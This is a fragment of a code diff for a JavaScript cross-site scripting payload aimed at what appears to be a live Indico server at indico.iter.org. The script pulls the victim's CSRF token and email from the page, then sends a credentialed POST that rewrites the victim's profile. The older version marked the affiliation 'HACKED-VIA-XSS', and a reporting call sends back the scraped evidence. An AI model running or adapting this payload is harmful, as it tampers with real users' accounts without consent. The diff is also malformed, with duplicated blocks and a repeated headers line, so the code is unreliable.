@@ -33,24 +33,22 @@
 
         if (!csrf || !email) {
           evidence.error = 'extraction failed';
-          evidence.html_chunk = html.substring(3000, 8000);
-          report(evidence);
-          return;
-        }
+      if (!csrf || !email) {
+        evidence.error = 'extraction failed';
+        evidence.html_chunk = html.substring(3000, 8000);
+        report(evidence);
+        return;
+      }
 
-        var payload = 'csrf_token=' + encodeURIComponent(csrf)
-          + '&first_name=' + encodeURIComponent(firstName || '')
-          + '&last_name=' + encodeURIComponent(lastName || '')
-          + '&email=' + encodeURIComponent(email)
-          + '&affiliation=' + encodeURIComponent('HACKED-VIA-XSS');
+      var payload = 'csrf_token=' + encodeURIComponent(csrf)
+        + '&first_name=' + encodeURIComponent(firstName || '')
+        + '&last_name=' + encodeURIComponent(lastName || '')
+        + '&email=' + encodeURIComponent(email)
 
-        fetch('https://indico.iter.org/user/profile/', {
-          method: 'POST',
-          credentials: 'include',
-          headers: {
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
+      fetch('https://indico.iter.org/user/profile/', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: payload
       })
         .then(function (r) {
